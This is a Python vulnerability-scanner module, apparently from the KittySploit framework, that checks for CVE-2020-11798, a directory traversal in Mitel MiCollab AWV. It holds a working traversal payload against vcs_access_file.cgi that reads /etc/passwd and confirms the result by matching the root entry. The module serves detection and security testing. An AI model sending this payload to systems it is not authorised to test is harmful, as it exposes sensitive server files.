#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Directory Traversal vulnerability in the web conference component of Mitel MiCollab AWV before 8."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mitel MiCollab AWV 8.1.2.4 and 9.1.3 - Directory Traversal Detection',
        'description': 'A Directory Traversal vulnerability in the web conference component of Mitel MiCollab AWV before 8.1.2.4 and 9.x before 9.1.3 could allow an attacker to access arbitrary files from restricted directories of the server via a crafted URL, due to insufficient access validation. A successful exploit could allow an attacker to access sensitive information from the restricted directories.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'packetstorm', 'mitel', 'micollab', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/171751/mma913-traversallfi.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-11798',
            'http://packetstormsecurity.com/files/171751/Mitel-MiCollab-AWV-8.1.2.4-9.1.3-Directory-Traversal-LFI.html',
            'https://www.mitel.com/-/media/mitel/file/pdf/support/security-advisories/security-bulletin-20-0005-01.pdf',
            'https://www.mitel.com/support/security-advisories/mitel-product-security-advisory-20-0005',
        ],
        'cve': 'CVE-2020-11798',
    }

    def run(self):
        r = self.http_request(method="GET", path='/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_all = ('application/x-download', 'filename=passwd',)
        body_regexes = ('root:.*:0:0:',)
        if (all(m in headers for m in header_all)) and (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Mitel MiCollab AWV 8.1.2.4 and 9.1.3 - Directory Traversal detected",
                path='/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd',
            )
            return True
        return False

